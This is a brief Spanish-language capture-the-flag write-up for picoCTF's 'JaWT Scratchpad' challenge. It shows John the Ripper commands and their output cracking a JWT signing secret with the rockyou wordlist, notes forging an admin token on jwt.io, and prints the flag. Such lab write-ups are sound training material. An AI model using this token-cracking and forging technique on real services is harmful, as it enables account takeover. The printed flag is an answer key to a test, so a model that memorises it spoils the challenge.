
# Reto 
### JaWT Scratchpad
## Descripcion
Check the admin scratchpad!http://fickle-tempest.picoctf.net:49259
## Solucion
```
uso de herramientas de desarrollador, buscar en cookies y usar jwt.io para crear un token nuevo, de igual manera usar los siguientes comandos en linux para encontrar el "secret" del token 
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:00 DONE (2026-05-01 12:51) 1.666g/s 12339Kp/s 12339Kc/s 12339KC/s iloverob4live345..ilovekelsy1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

picoCTF{jawt_was_just_what_you_thought_bbb82bd4a57564aefb32d69dafb60583}
```
## Notas adicionales 

## Referencias


